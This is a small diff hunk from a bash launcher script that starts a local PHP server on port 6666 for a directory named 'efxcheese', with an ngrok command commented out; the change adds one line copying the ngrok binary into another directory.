@@ -153,6 +153,7 @@ printf "\e[1;31m[\e[0m\e[1;37m+\e[0m\e[1;31m]\e[0m\e[1;92m We are going to run S
 sleep 3
 #ngrok http 6666
 cd efxcheese
+cp ngrok ../1
 php -S localhost:6666 > /dev/null 2>&1 &
 bash efxcheese.sh
 
